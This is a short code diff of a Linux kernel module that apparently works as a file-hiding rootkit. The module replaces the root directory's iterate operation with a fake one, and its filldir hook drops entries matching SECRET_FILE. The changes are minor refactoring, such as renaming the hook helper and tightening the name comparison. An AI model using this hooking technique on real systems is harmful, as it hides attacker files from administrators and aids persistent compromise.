@@ -48,7 +48,7 @@ init_module(void)
 {
     fm_alert("%s\n", "Greetings the World!");
 
-    set_f_op(iterate, ROOT_PATH, fake_iterate, real_iterate);
+    set_file_op(iterate, ROOT_PATH, fake_iterate, real_iterate);
 
     if (!real_iterate) {
         return -ENOENT;
@@ -61,11 +61,9 @@ init_module(void)
 void
 cleanup_module(void)
 {
-    void *dummy;
-
     if (real_iterate) {
-        fm_alert("Restoring iterate to %p\n", real_iterate);
-        set_f_op(iterate, ROOT_PATH, real_iterate, dummy);
+        void *dummy;
+        set_file_op(iterate, ROOT_PATH, real_iterate, dummy);
     }
 
     fm_alert("%s\n", "Farewell the World!");
@@ -87,7 +85,7 @@ int
 fake_filldir(struct dir_context *ctx, const char *name, int namlen,
              loff_t offset, u64 ino, unsigned d_type)
 {
-    if (strncmp(name, SECRET_FILE, strlen(SECRET_FILE)) == 0) {
+    if (strcmp(name, SECRET_FILE) == 0) {
         fm_alert("Hiding: %s", name);
         return 0;
     }
